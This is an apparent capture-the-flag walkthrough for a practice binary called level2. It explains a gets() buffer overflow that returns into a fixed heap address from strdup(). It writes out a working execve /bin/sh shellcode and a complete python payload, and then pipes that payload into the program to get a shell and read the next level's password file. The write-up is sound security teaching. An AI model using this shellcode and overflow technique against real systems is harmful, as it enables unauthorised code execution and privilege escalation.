# Level2 Walkthrough

## Analyzing the Program with GDB

1. **Disassemble the `main` function**:
   Using the command `disas`, we found that the program uses two functions :
   - p : flushes stdout, reads user input using gets(), chek for dangerous input, handle safe input, and if they are, prints it using puts() and duplicates it using strdup()
   - main : calls the function `p` at 0x8048d4

## Running the program

1. **Execute the Program with the Correct Input**:  
   We ran the program with the following command:  
   ```bash
   ./level2
   ```
    The program is waiting for the user to insert an input, prints it back and then exits properly.

2. **Trying to overflow the RET value**
    As it calls the function gets() which is vulnerable to buffer overflow attack, we can see that there is now a check to make sure we do not overwrite the return address.

    This avoids having a shellcode stored on the stack or in environment variable.

    The function p() uses the strdup(), which uses malloc() which stores the memory in the heap. This will be our entrypoint.

    adter launching ltrace ./level2, we can see that malloc always return to address 0x804a008.

    We'll try to copy a shellcode in the heap by writing it in the input prompt and then write the allocated address (malloc) on the return address.

    we will use this shellcode : 
    ```\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80```

    Since its 21 bytes long, we'll have to pad our string with arbitrary data to provoke the overflow.

    Finally, as in the previous level, we will create an exploit to: 
    ```python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"' > /tmp/exploit2```

    then we will launch the command ```cat /tmp/exploit2 - | ./level2```

    we are now in level3, as we can notice with the ```whoami``` command.
    Now, we just have to launch ```cat /home/user/level3/.pass```

## Moving to level3

1. **Swith User to level3**:
    Run ```su level3```

2. **Authenticate with the Password**:
    We used the password we found.